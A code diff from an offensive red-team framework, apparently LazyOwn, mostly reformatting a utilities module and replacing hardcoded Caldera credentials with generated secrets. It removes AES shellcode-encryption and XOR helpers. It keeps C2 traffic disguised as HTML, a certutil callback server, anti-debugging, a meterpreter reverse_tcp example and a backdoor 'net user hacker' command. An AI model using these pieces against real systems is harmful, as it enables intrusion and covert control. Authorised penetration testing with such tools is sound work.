+    pool_dir = os.path.join(repo_dir, "pool/main")
     os.makedirs(pool_dir, exist_ok=True)
 
     for package in os.listdir(repo_dir):
-        if package.endswith('.deb'):
+        if package.endswith(".deb"):
             shutil.move(os.path.join(repo_dir, package), os.path.join(pool_dir, package))
 
-    subprocess.run(
-        f"dpkg-scanpackages {pool_dir} /dev/null > {dists_dir}/Packages",
-        shell=True, check=True
-    )
-    subprocess.run(
-        f"gzip -9c {dists_dir}/Packages > {dists_dir}/Packages.gz",
-        shell=True, check=True
-    )
-    subprocess.run(
-        f"xz -9c {dists_dir}/Packages > {dists_dir}/Packages.xz",
-        shell=True, check=True
-    )
+    with open(os.path.join(dists_dir, "Packages"), "w") as fh:
+        subprocess.run(["dpkg-scanpackages", pool_dir, "/dev/null"], stdout=fh, check=True)
+    with open(os.path.join(dists_dir, "Packages.gz"), "wb") as fh:
+        subprocess.run(["gzip", "-9c", os.path.join(dists_dir, "Packages")], stdout=fh, check=True)
+    with open(os.path.join(dists_dir, "Packages.xz"), "wb") as fh:
+        subprocess.run(["xz", "-9c", os.path.join(dists_dir, "Packages")], stdout=fh, check=True)
 
-    release_file = os.path.join(repo_dir, 'dists/kali-rolling/Release')
-    with open(release_file, 'w') as release:
+    release_file = os.path.join(repo_dir, "dists/kali-rolling/Release")
+    with open(release_file, "w") as release:
         release.write("Origin: Kali\n")
         release.write("Label: Kali\n")
         release.write("Suite: rolling\n")
@@ -2229,12 +2430,11 @@ def generate_index(repo_dir):
             file_path = os.path.relpath(os.path.join(root, file), repo_dir)
             index_content.append(f'<a href="{file_path}">{file}</a><br>')
 
-    with open(os.path.join(repo_dir, 'index.html'), 'w') as index_file:
-        index_file.write('<html><body>\n')
-        index_file.write('<h1>APT Repository Index</h1>\n')
-        index_file.write(''.join(index_content))
-        index_file.write('</body></html>\n')
-
+    with open(os.path.join(repo_dir, "index.html"), "w") as index_file:
+        index_file.write("<html><body>\n")
+        index_file.write("<h1>APT Repository Index</h1>\n")
+        index_file.write("".join(index_content))
+        index_file.write("</body></html>\n")
 
 
 def replace_variables(command, variables):
@@ -2257,6 +2457,7 @@ def replace_variables(command, variables):
         command = command.replace(var, value)
     return command
 
+
 def create_caldera_config(file_path):
     """
     Creates a Caldera configuration file with the specified content at the given file path.
@@ -2267,10 +2468,21 @@ def create_caldera_config(file_path):
     Returns:
     None
     """
-    config_content = """
+    import secrets
+
+    api_key_blue = secrets.token_hex(16)
+    api_key_red = secrets.token_hex(16)
+    encryption_key = secrets.token_hex(16)
+    crypt_salt = secrets.token_hex(16)
+    ftp_password = secrets.token_urlsafe(16)
+    blue_password = secrets.token_urlsafe(16)
+    red_admin_password = secrets.token_urlsafe(16)
+    red_password = secrets.token_urlsafe(16)
+
+    config_content = f"""
 ability_refresh: 60
-api_key_blue: LAZYOWNBLUEADMIN123
-api_key_red: LAZYOWNREDADMIN123
+api_key_blue: {api_key_blue}
+api_key_red: {api_key_red}
 app.contact.dns.domain: mycaldera.caldera
 app.contact.dns.socket: 0.0.0.0:8853
 app.contact.gist: API_KEY
@@ -2282,11 +2494,11 @@ app.contact.slack.channel_id: SLACK_CHANNEL_ID
 app.contact.tunnel.ssh.host_key_file: REPLACE_WITH_KEY_FILE_PATH
 app.contact.tunnel.ssh.host_key_passphrase: REPLACE_WITH_KEY_FILE_PASSPHRASE
 app.contact.tunnel.ssh.socket: 0.0.0.0:8022
-app.contact.tunnel.ssh.user_name: grisun0
-app.contact.tunnel.ssh.user_password: grisgrisgris
+app.contact.tunnel.ssh.user_name: CHANGE_ME
+app.contact.tunnel.ssh.user_password: CHANGE_ME
 app.contact.ftp.host: 0.0.0.0
 app.contact.ftp.port: 2222
-app.contact.ftp.pword: lazyown
+app.contact.ftp.pword: {ftp_password}
 app.contact.ftp.server.dir: ftp_dir
 app.contact.ftp.user: lazyown_user
 app.contact.tcp: 0.0.0.0:7010
@@ -2294,8 +2506,8 @@ app.contact.udp: 0.0.0.0:7011
 app.contact.websocket: 0.0.0.0:7012
 app.frontend.api_base_url: http://localhost:8888
 objects.planners.default: atomic
-crypt_salt: REPLACE_WITH_RANDOM_VALUE
-encryption_key: LAZYOWNADMIN123
+crypt_salt: {crypt_salt}
+encryption_key: {encryption_key}
 exfil_dir: /tmp/lazyown
 reachable_host_traits:
 - remote.host.fqdn
@@ -2327,18 +2539,20 @@ requirements:
     version: 3.12.7
 users:
   blue:
-    blue: lazyownblueadmin
+    blue: {blue_password}
   red:
-    admin: lazyownredteamtheadmin
-    red: lazyownredteamadmin
+    admin: {red_admin_password}
+    red: {red_password}
 """
 
     try:
-        with open(file_path, 'w') as file:
+        with open(file_path, "w") as file:
             file.write(config_content)
+        os.chmod(file_path, 0o600)
         print_msg(f"Configuration file created successfully at {file_path}")
     except Exception as e:
         print_error(f"Error creating configuration file: {e}")
+
 
 def extract_banners(xml_file):
     """
@@ -2366,43 +2580,28 @@ def extract_banners(xml_file):
     root = tree.getroot()
 
     banners = []
-    for host in root.findall('host'):
+    for host in root.findall("host"):
+        hostname = host.find("address").get("addr")
 
-        hostname = host.find('address').get('addr')
-
-        for port in host.findall('ports/port'):
-
-            service = port.find('service')
+        for port in host.findall("ports/port"):
+            service = port.find("service")
             if service is not None:
-                name = service.get('name')
+                name = service.get("name")
 
-                extrainfo = service.get('extrainfo')
+                extrainfo = service.get("extrainfo")
 
-
-                banners.append({
-                    'hostname': hostname,
-                    'port': port.get('portid'),
-                    'protocol': port.get('protocol'),
-                    'banner': extrainfo,
-
-                    'service': name
-                })
+                banners.append(
+                    {
+                        "hostname": hostname,
+                        "port": port.get("portid"),
+                        "protocol": port.get("protocol"),
+                        "banner": extrainfo,
+                        "service": name,
+                    }
+                )
 
     return banners
 
-def generate_xor_key(length):
-    """
-    Generate key XOR long specifyed
-
-    :param length: Lenght of XOR key
-    :return: Key XOR in hex.
-    """
-    if length <= 0:
-        raise ValueError("The lenght must be logg than 0")
-    key_bytes = [random.randint(0, 255) for _ in range(length)]
-    key_hex = ''.join(f'{byte:02X}' for byte in key_bytes)
-
-    return key_hex
 
 def scrape_news():
     """
@@ -2413,19 +2612,19 @@ def scrape_news():
     """
     url = "https://news.ycombinator.com/"
     response = requests.get(url)
-    soup = BeautifulSoup(response.content, 'html.parser')
+    soup = BeautifulSoup(response.content, "html.parser")
 
     titles = []
     links = []
     scores = []
 
-    for item in soup.find_all('tr', class_='athing'):
-        title_line = item.find('span', class_='titleline')
+    for item in soup.find_all("tr", class_="athing"):
+        title_line = item.find("span", class_="titleline")
         if title_line:
             title = title_line.text
-            title_link = title_line.find('a')
-            link = title_link['href']
-            score = item.find_next_sibling('tr').find('span', class_='score')
+            title_link = title_line.find("a")
+            link = title_link["href"]
+            score = item.find_next_sibling("tr").find("span", class_="score")
             if score:
                 score = score.text
             else:
@@ -2438,6 +2637,7 @@ def scrape_news():
 
     return titles, links, scores
 
+
 def display_news(titles, links, scores):
     """
     Creates a pandas DataFrame and prints it, showing titles, links, and scores.
@@ -2447,13 +2647,10 @@ def display_news(titles, links, scores):
         links (list): List of news links.
         scores (list): List of news scores.
     """
-    df = pd.DataFrame({
-        'Title': titles,
-        'Link': links,
-        'Score': scores
-    })
+    df = pd.DataFrame({"Title": titles, "Link": links, "Score": scores})
 
     print_msg(df)
+
 
 def htmlify(data):
     """Wrap C2 comms in html and html2 code to make requests look more legitimate"""
@@ -2463,7 +2660,8 @@ def htmlify(data):
     html2 = "</b>\n"
     html2 += "</body>\n"
     html2 += "</html>\n"
-    return(html + data + "\n" + html2)
+    return html + data + "\n" + html2
+
 
 def de_htmlify(data):
     """Cleant wrap C2 comms of html and html2 code to get the command from request"""
@@ -2473,10 +2671,11 @@ def de_htmlify(data):
     html2 = "</b>\n"
     html2 += "</body>\n"
     html2 += "</html>\n"
-    data = data.replace(html,'').replace(html2,'')
-    return(data)
+    data = data.replace(html, "").replace(html2, "")
+    return data
 
-def is_port_in_use(port, host='127.0.0.1'):
+
+def is_port_in_use(port, host="127.0.0.1"):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         try:
             s.bind((host, port))
@@ -2498,6 +2697,7 @@ def return_creds():
 
             return credentials
 
+
 def query_arin_ip(ip):
     """Queries ARIN whois API for organization information of an IP address.
 
@@ -2515,6 +2715,7 @@ def query_arin_ip(ip):
     except Exception as e:
         print_error(f"ARIN API failed: {e}")
     return None
+
 
 def get_org(data):
     """Extracts organization name from ARIN whois response data.
@@ -2534,13 +2735,18 @@ def get_org(data):
 
 
 def load_adversary():
-    with open('adversary.json', 'r') as file:
+    with open("adversary.json", "r") as file:
         config_list = json.load(file)
     return [Config(config) for config in config_list]
+
 
 def replace_placeholders(template, replacements):
     """
     Replace placeholders in a template string with values from a dictionary.
+
+    Single-pass delegation to replace_command_placeholders: substituted
+    values are never re-scanned, so a value that looks like a placeholder
+    stays literal instead of triggering a second substitution.
 
     Parameters:
         template (str): The template string containing placeholders.
@@ -2549,18 +2755,17 @@ def replace_placeholders(template, replacements):
     Returns:
         str: The template string with placeholders replaced.
     """
-    for key, value in replacements.items():
-        template = template.replace(f"{{{key}}}", str(value))
-    return template
+    return replace_command_placeholders(template, replacements)
+
 
 def replace_command_placeholders(command, params):
     """
-    Replace placeholders in a command string with values from a params dictionary,
-    handling spaces within placeholders.
+    Replace placeholders in a command string with values from a params dictionary.
 
-    The function looks for placeholders in curly braces (e.g., {url} or { url }) within
-    the command string and replaces them with corresponding values from the params dictionary,
-    ignoring any spaces inside the curly braces.
+    Supports both single-brace ``{key}`` and double-brace ``{{key}}`` placeholder
+    syntax, with optional whitespace inside the braces (``{ key }``). Addons are
+    documented to emit ``{{key}}`` (see ``modules/yaml_generator.py``). Unknown
+    keys are left intact so an unresolved placeholder is easy to spot.
 
     Args:
         command (str): The command string containing placeholders.
@@ -2572,13 +2777,15 @@ def replace_command_placeholders(command, params):
     import re
 
     def replace_match(match):
-        key = match.group(1).strip()  # Remove any spaces from the captured key
-        return str(params.get(key, match.group(0)))  # Return replacement or original if not found
+        token = match.group(0)
+        key = token.strip("{}").strip()
+        return str(params.get(key, token))
 
-    return re.sub(r'\{([^}]+)\}', replace_match, command)
+    return re.sub(r"(\{\{[^{}]*?\}\}|\{[^{}]*?\})", replace_match, command)
+
 
 def parse_nmap_csv(csv_path):
-    df = pd.read_csv(csv_path, delimiter=";", on_bad_lines='skip')
+    df = pd.read_csv(csv_path, delimiter=";", on_bad_lines="skip")
     services = {}
     for _, row in df.iterrows():
         service_name = row["SERVICE"].strip().lower()
@@ -2587,23 +2794,15 @@ def parse_nmap_csv(csv_path):
         version = row.get("VERSION", "")
         if service_name not in services:
             services[service_name] = []
-        services[service_name].append({
-            "ip": ip,
-            "port": port,
-            "version": version
-        })
+        services[service_name].append({"ip": ip, "port": port, "version": version})
     return services
+
+
 def query_ollama(prompt, model="deepseek-r1:1.5b"):
     """Sends query to Ollama and returns model response."""
     try:
         response = requests.post(
-            "http://localhost:11434/api/generate",
-            json={
-                "model": model,
-                "prompt": prompt,
-                "stream": False
-            },
-            timeout=600
+            "http://localhost:11434/api/generate", json={"model": model, "prompt": prompt, "stream": False}, timeout=600
         )
         if response.status_code == 200:
             return response.json()["response"]
@@ -2613,6 +2812,7 @@ def query_ollama(prompt, model="deepseek-r1:1.5b"):
         print_error(f"[!] Ollama error: {str(e)}")
         return None
 
+
 def preprocess_llm_response(response):
     """
     Pre-process LLM response to handle common issues before YAML parsing
@@ -2620,14 +2820,14 @@ def preprocess_llm_response(response):
     import re
 
     # Remove any markdown code block markers
-    response = re.sub(r'```yaml\s*', '', response)
-    response = re.sub(r'```\s*', '', response)
+    response = re.sub(r"```yaml\s*", "", response)
+    response = re.sub(r"```\s*", "", response)
 
     # Remove any thinking or explanatory text
     if "<think>" in response:
         think_end = response.find("</think>")
         if think_end > 0:
-            response = response[think_end + 8:].strip()
+            response = response[think_end + 8 :].strip()
 
     # Remove any leading text before apt_name
     apt_name_pos = response.find("apt_name:")
@@ -2636,14 +2836,14 @@ def preprocess_llm_response(response):
 
     # Remove any trailing text after the YAML content
     last_yaml_line = -1
-    lines = response.split('\n')
+    lines = response.split("\n")
     for i, line in enumerate(lines):
         stripped = line.strip()
-        if stripped and not stripped.startswith('#') and ':' in stripped:
+        if stripped and not stripped.startswith("#") and ":" in stripped:
             last_yaml_line = i
 
     if last_yaml_line >= 0 and last_yaml_line < len(lines) - 1:
-        response = '\n'.join(lines[:last_yaml_line + 1])
+        response = "\n".join(lines[: last_yaml_line + 1])
 
     return response
 
@@ -2653,20 +2853,19 @@ def manual_yaml_extraction(content):
     Fallback method to manually extract YAML data from malformed content
     """
     import re
-    import yaml
 
     result = {}
-    lines = content.split('\n')
+    lines = content.split("\n")
 
     # Extract apt_name
-    apt_name_match = re.search(r'apt_name:\s*(.+)', content)
+    apt_name_match = re.search(r"apt_name:\s*(.+)", content)
     if apt_name_match:
-        result['apt_name'] = apt_name_match.group(1).strip()
+        result["apt_name"] = apt_name_match.group(1).strip()
 
     # Extract description
-    desc_match = re.search(r'description:\s*(.+)', content)
+    desc_match = re.search(r"description:\s*(.+)", content)
     if desc_match:
-        result['description'] = desc_match.group(1).strip()
+        result["description"] = desc_match.group(1).strip()
 
     # Extract steps - this is more complex
     steps = []
@@ -2677,7 +2876,9 @@ def manual_yaml_extraction(content):
         stripped = line.strip()
 
         # Start of a new step
-        if stripped.startswith('- atomic_id:') or (stripped == '-' and lines.index(line) < len(lines) - 1 and 'atomic_id:' in lines[lines.index(line) + 1]):
+        if stripped.startswith("- atomic_id:") or (
+            stripped == "-" and lines.index(line) < len(lines) - 1 and "atomic_id:" in lines[lines.index(line) + 1]
+        ):
             if current_step:
                 steps.append(current_step)
             current_step = {}
@@ -2687,19 +2888,19 @@ def manual_yaml_extraction(content):
         # Parse step properties
         if current_step is not None:
             # Handle mitre_info subsection
-            if 'mitre_info:' in stripped:
+            if "mitre_info:" in stripped:
                 in_mitre_info = True
-                current_step['mitre_info'] = {}
+                current_step["mitre_info"] = {}
                 continue
 
             # Parse regular key-value pairs
-            if ':' in stripped:
-                parts = stripped.split(':', 1)
+            if ":" in stripped:
+                parts = stripped.split(":", 1)
                 key = parts[0].strip()
                 value = parts[1].strip() if len(parts) > 1 else ""
 
                 if in_mitre_info:
-                    current_step['mitre_info'][key] = value
+                    current_step["mitre_info"][key] = value
                 else:
                     current_step[key] = value
 
@@ -2708,9 +2909,10 @@ def manual_yaml_extraction(content):
         steps.append(current_step)
 
     if steps:
-        result['steps'] = steps
+        result["steps"] = steps
 
-    return result if 'apt_name' in result and 'steps' in result else None
+    return result if "apt_name" in result and "steps" in result else None
+
 
 def create_synthetic_yaml(nmap_services):
     """
@@ -2744,7 +2946,7 @@ def create_synthetic_yaml(nmap_services):
     playbook = {
         "apt_name": "SyntheticAttackChain",
         "description": "Automatically generated playbook based on discovered services",
-        "steps": []
+        "steps": [],
     }
 
     # Generate steps based on discovered services
@@ -2776,16 +2978,14 @@ def create_synthetic_yaml(nmap_services):
                 "description": f"Attempt to exploit {service_name} service",
                 "command": command,
                 "service": service_name,
-                "mitre_info": {
-                    "mitre_id": technique["id"],
-                    "mitre_name": technique["name"]
-                }
+                "mitre_info": {"mitre_id": technique["id"], "mitre_name": technique["name"]},
             }
 
             playbook["steps"].append(step)
             step_id += 1
 
     return playbook
+
 
 def parse_yaml_response(content):
     """
@@ -2820,6 +3020,8 @@ def parse_yaml_response(content):
         except Exception as e2:
             print_error(f"[!] Recovery attempt failed: {str(e2)}")
             return None
+
+
 def fix_common_yaml_issues(yaml_content):
     """Fixes common YAML formatting issues"""
     import re
@@ -2829,7 +3031,7 @@ def fix_common_yaml_issues(yaml_content):
     current_indent = 0
     expected_indent = None
 
-    for line in yaml_content.split('\n'):
+    for line in yaml_content.split("\n"):
         stripped = line.lstrip()
 
         # Skip empty lines
@@ -2841,30 +3043,31 @@ def fix_common_yaml_issues(yaml_content):
         indent = len(line) - len(stripped)
 
         # Fix common issue with mixed spaces and improper indentation
-        if stripped.startswith('- ') and expected_indent is not None and indent != expected_indent:
+        if stripped.startswith("- ") and expected_indent is not None and indent != expected_indent:
             # Adjust indentation for list items
-            fixed_line = ' ' * expected_indent + stripped
+            fixed_line = " " * expected_indent + stripped
             fixed_content.append(fixed_line)
         else:
             fixed_content.append(line)
 
         # Set expected indentation for next items if this is a property
-        if ':' in stripped and not stripped.startswith('- '):
+        if ":" in stripped and not stripped.startswith("- "):
             current_indent = indent
             expected_indent = indent + 2  # Common YAML convention for nested items
 
     # Fix 2: Fix invalid mapping values (the specific error you encountered)
-    result = '\n'.join(fixed_content)
-    result = re.sub(r'(\w+):\s+(\w+):\s+', r'\1:\n  \2: ', result)
+    result = "\n".join(fixed_content)
+    result = re.sub(r"(\w+):\s+(\w+):\s+", r"\1:\n  \2: ", result)
 
     return result
+
 
 def aggressive_yaml_fix(yaml_content):
     """More aggressive YAML fixing for recovery attempts"""
     import re
 
     # Fix multi-line values without proper block scalar indicators
-    lines = yaml_content.split('\n')
+    lines = yaml_content.split("\n")
     fixed_lines = []
     in_block = False
 
@@ -2872,8 +3075,8 @@ def aggressive_yaml_fix(yaml_content):
         stripped = line.lstrip()
 
         # Handle mapping errors - common cause of "mapping values not allowed here"
-        if re.search(r':\s+\w+:\s+', line):
-            parts = re.split(r':\s+', line, 1)
+        if re.search(r":\s+\w+:\s+", line):
+            parts = re.split(r":\s+", line, 1)
             if len(parts) > 1:
                 fixed_lines.append(f"{parts[0]}:")
                 fixed_lines.append(f"  {parts[1]}")
@@ -2882,13 +3085,12 @@ def aggressive_yaml_fix(yaml_content):
         fixed_lines.append(line)
 
     # Try to identify and fix specific line with error
-    content = '\n'.join(fixed_lines)
+    content = "\n".join(fixed_lines)
 
     # Last resort: Replace any potential inline mapping errors
-    content = re.sub(r'(\w+):\s+(\w+):\s+', r'\1:\n  \2: ', content)
+    content = re.sub(r"(\w+):\s+(\w+):\s+", r"\1:\n  \2: ", content)
 
     return content
-
 
 
 def save_playbook(playbook_data, playbook_name):
@@ -2902,12 +3104,14 @@ def save_playbook(playbook_data, playbook_name):
 
     return playbook_path
 
+
 def load_knowledge_base(knowledge_file="my_techniques.json"):
     """Carga la base de conocimientos personalizada."""
     if os.path.exists(knowledge_file):
         with open(knowledge_file, "r") as f:
             return json.load(f)
     return []
+
 
 def anti_debug():
     if os.path.exists("/proc/self/status"):
@@ -2916,6 +3120,7 @@ def anti_debug():
                 if line.startswith("TracerPid:") and int(line.split()[1]) != 0:
                     print_error("DEBUG DETECTED. EXITING!.")
                     os.kill(os.getpid(), signal.SIGTERM)
+
 
 def create_msfshellcoder_parser():
     parser = argparse.ArgumentParser(
@@ -2926,7 +3131,7 @@ Examples:
   msfshellcoder -c "calc.exe" --os windows
   msfshellcoder
         """,
-        formatter_class=argparse.RawDescriptionHelpFormatter
+        formatter_class=argparse.RawDescriptionHelpFormatter,
     )
     parser.add_argument("-p", "--payload", help="MSF payload (e.g., windows/x64/meterpreter/reverse_tcp)")
     parser.add_argument("-c", "--command", help="Custom command to execute (e.g., 'net user hacker P@ss /add')")
@@ -2936,45 +3141,32 @@ Examples:
     parser.add_argument("--arch", choices=["x86", "x64"], default="x64", help="Architecture (default: x64)")
     return parser
 
+
 def load_user_aliases():
     """Carga los aliases del archivo JSON si existe."""
     if os.path.exists(USER_ALIASES_FILE):
         try:
-            with open(USER_ALIASES_FILE, 'r') as f:
+            with open(USER_ALIASES_FILE, "r") as f:
                 return json.load(f)
         except (json.JSONDecodeError, PermissionError) as e:
             print_error(f"[!] Error al cargar {USER_ALIASES_FILE}: {e}")
             return {}
     return {}
 
-def AESencrypt(plaintext, key):
-    k = hashlib.sha256(key).digest()
-    iv = 16 * b'\x00'
-    plaintext = pad(plaintext, AES.block_size)
-    cipher = AES.new(k, AES.MODE_CBC, iv)
-    ciphertext = cipher.encrypt(plaintext)
-    return ciphertext,key
-  
-def dropFile(key, ciphertext):
-  with open("sessions/cipher.bin", "wb") as fc:
-    fc.write(ciphertext)
-  with open("sessions/key.bin", "wb") as fk:
-    fk.write(key)
-  #print('char AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
-  #print('unsigned char AESshellcode[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')
- 
-
 
 class MyServer(HTTPServer):
     """
     Custom HTTP server to handle incoming connections from certutil.
     """
+
     pass
+
 
 class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
     """
     Custom HTTP request handler to intercept and decode GET requests from certutil.
     """
+
     def log_request(self, *args, **kwargs):
         return
 
@@ -2982,16 +3174,19 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         return
 
     def do_GET(self):
+        """Serve certutil callback using centralized payload config."""
         global query_id
         self.send_error(404)
 
-        with open('payload.json', 'r') as file:
-            data = json.load(file)
-        url = data.get('url', 'URL not found')
-        lhost = data.get('lhost', 'LHOST not found')
+        try:
+            data = load_payload()
+        except (OSError, ValueError):
+            data = {}
+        url = data.get("url", "URL not found")
+        lhost = data.get("lhost", "LHOST not found")
         if query_id % 2 == 0:
             output = self.path
-            if output != '/':
+            if output != "/":
                 print(decode(output[1:]))
             get_command(url, lhost)
         query_id += 1
@@ -3005,14 +3200,14 @@ class IP2ASN:
 
     def open_file(self, filename):
         """Open and parse the IP-to-ASN file."""
-        with open(filename, 'rb') as f:
+        with open(filename, "rb") as f:
             self.open_reader(f)
 
     def open_reader(self, reader):
         """Parse the reader stream, handling both regular and gzipped files."""
-        if reader.read(2) == b'\x1f\x8b':
+        if reader.read(2) == b"\x1f\x8b":
             reader.seek(0)
-            with gzip.open(reader, 'rb') as f:
+            with gzip.open(reader, "rb") as f:
                 self._parse_file(f)
         else:
             reader.seek(0)
@@ -3021,8 +3216,8 @@ class IP2ASN:
     def _parse_file(self, reader):
         """Parse the TSV data and load it into memory."""
         for line in reader:
-            line = line.decode('utf-8').strip()
-            parts = line.split('\t')
+            line = line.decode("utf-8").strip()
+            parts = line.split("\t")
             if len(parts) < 5:
                 continue
             start_ip, end_ip, asn, country, desc = parts[:5]
@@ -3071,6 +3266,7 @@ class IP2ASN:
         """Get the country by ASN."""
         return self.as_country.get(asn, "Unknown")
 
+
 VULN_SESSION_FILE_TEMPLATE = "vulns_{target}.json"
 VULN_SCHEMA_VERSION = 1
 VULN_REPORT_PRINT_HEADER = "CVE ID;   Description;   CVSS;  URL"
@@ -3078,12 +3274,9 @@ VULN_CVSS_UNAVAILABLE = "unavailable"
 VULN_DEFAULT_MAX_WORKERS = 20
 VULN_DEFAULT_DESCRIPTION_LANG = "en"
 VULN_DEFAULT_USER_AGENT = (
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
 )
-VULN_NVD_URL_TEMPLATE = (
-    "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={service}"
-)
+VULN_NVD_URL_TEMPLATE = "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={service}"
 VULN_CVE_DETAILS_URL_TEMPLATE = "https://www.cvedetails.com/cve/{cve_id}/"
 VULN_HTTP_OK = 200
 
@@ -3154,9 +3347,7 @@ class VulnerabilityScanner:
             print_error(f"NVD request failed: {exc}")
             return []
         if response.status_code != VULN_HTTP_OK:
-            print_error(
-                f"NVD returned HTTP {response.status_code} while searching '{service}'."
-            )
+            print_error(f"NVD returned HTTP {response.status_code} while searching '{service}'.")
             return []
         data_dict = response.json()
         cves_info: list[dict] = []
@@ -3167,11 +3358,7 @@ class VulnerabilityScanner:
                 continue
             descriptions = cve_node.get("descriptions", [])
             description = next(
-                (
-                    item.get("value")
-                    for item in descriptions
-                    if item.get("lang") == self._description_language
-                ),
+                (item.get("value") for item in descriptions if item.get("lang") == self._description_language),
                 None,
             )
             cves_info.append(
@@ -3205,9 +3392,7 @@ class VulnerabilityScanner:
             return
         soup = BeautifulSoup(response.content, "html.parser")
         cvss_info = soup.find("div", {"class": "cvssbox"})
-        cve_info["cvss"] = (
-            cvss_info.get_text().strip() if cvss_info else VULN_CVSS_UNAVAILABLE
-        )
+        cve_info["cvss"] = cvss_info.get_text().strip() if cvss_info else VULN_CVSS_UNAVAILABLE
         cve_info["url"] = details_url
 
     def persist(self, service: str, target: str, cves: list[dict]) -> str:
@@ -3269,38 +3454,58 @@ class VulnerabilityScanner:
 
         for cve in sorted(cves_details, key=_cvss_sort_key):
             cvss_value = cve.get("cvss") or VULN_CVSS_UNAVAILABLE
-            content = (
-                f"{cve.get('cve_id')};    {cve.get('description')};"
-                f"   {cvss_value}; {cve.get('url')} \n"
-            )
+            content = f"{cve.get('cve_id')};    {cve.get('description')};   {cvss_value}; {cve.get('url')} \n"
             print_msg(content)
+
 
 def _build_startup_parser() -> argparse.ArgumentParser:
     """Build the CLI argument parser for LazyOwn startup flags."""
+    prog_name = os.path.basename(sys.argv[0]) if sys.argv and sys.argv[0] else "lazyown"
     parser = argparse.ArgumentParser(
-        prog="./run",
+        prog=prog_name,
         add_help=False,
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
     parser.add_argument("-h", "--help", action="store_true", default=False)
-    parser.add_argument("-v", "--version", action="store_true", default=False)
+    parser.add_argument("-v", "-V", "--version", action="store_true", default=False)
     parser.add_argument("-p", "--payload", metavar="payloadN.json", default=None)
     parser.add_argument("-c", "--command", metavar="command", default=None)
     parser.add_argument("--no-banner", action="store_true", dest="no_banner", default=False)
     parser.add_argument("-s", "--sudo", action="store_true", default=False)
     parser.add_argument("--old-banner", action="store_true", dest="old_banner", default=False)
     parser.add_argument("--no-logs", action="store_true", dest="no_logs", default=False)
+    parser.add_argument(
+        "--headless", action="store_true", default=False, help="Non-interactive mode with structured output (JSON)."
+    )
+    parser.add_argument(
+        "--json-output", action="store_true", default=False, help="Emit JSON results for every command."
+    )
+    parser.add_argument(
+        "--profile", metavar="profile.yaml", default=None, help="YAML profile to override payload.json keys."
+    )
+    parser.add_argument(
+        "--run-chain",
+        metavar='"cmd1; cmd2; cmd3"',
+        default=None,
+        help="Semicolon-separated command chain (must be quoted).",
+    )
     return parser
 
 
 arguments = sys.argv[1:]
 anti_debug()
 
+# Startup-flag parsing runs ONLY for real LazyOwn entry points. utils is
+# also imported as a library by headless tools (bridges, MCP, tests)
+# whose own argv would otherwise be misreported as "Wrong argument".
+_ENTRY_BASENAMES = {"lazyown.py", "lazyown", "run", "run.bat", "lazyown.cmd"}
+_is_entry_point = os.path.basename(sys.argv[0]) in _ENTRY_BASENAMES if sys.argv and sys.argv[0] else False
+
 startup_ns, unknown_args = _build_startup_parser().parse_known_args(arguments)
 
-if startup_ns.help:
+if startup_ns.help and _is_entry_point:
     halp()
-if startup_ns.version:
+if startup_ns.version and _is_entry_point:
     print_msg(f"LazyOwn Framework: {version}")
     sys.exit(0)
 if startup_ns.no_banner:
@@ -3311,19 +3516,29 @@ if startup_ns.no_logs:
     NOLOGS = True
 if startup_ns.old_banner:
     BANNER = OLD_BANNER
+if startup_ns.headless:
+    HEADLESS = True
+    NOBANNER = True
 if startup_ns.command:
-    print_msg(f"Exec: option -c {startup_ns.command}")
+    if not HEADLESS:
+        print_msg(f"Exec: option -c {startup_ns.command}")
 if startup_ns.payload:
     print_msg(f"Load Payload: option -p {startup_ns.payload}")
+if startup_ns.run_chain:
+    if not HEADLESS:
+        print_msg(f"Exec: chain {startup_ns.run_chain}")
+if startup_ns.profile:
+    if not HEADLESS:
+        print_msg(f"Profile: {startup_ns.profile}")
 for u_arg in unknown_args:
-    if u_arg.startswith("-"):
+    if u_arg.startswith("-") and _is_entry_point:
         print_error(f"Error: Wrong argument: {u_arg}")
 
 if sys.version_info <= (3, 0):
     sys.stdout.write("Sorry, requires Python 3.x, not Python 2.x\n")
     sys.exit(1)
 
-if os.name == 'nt':
+if os.name == "nt":
     print("WINDOWS as Host OS Not currently supported - exiting")
     sys.exit()
 
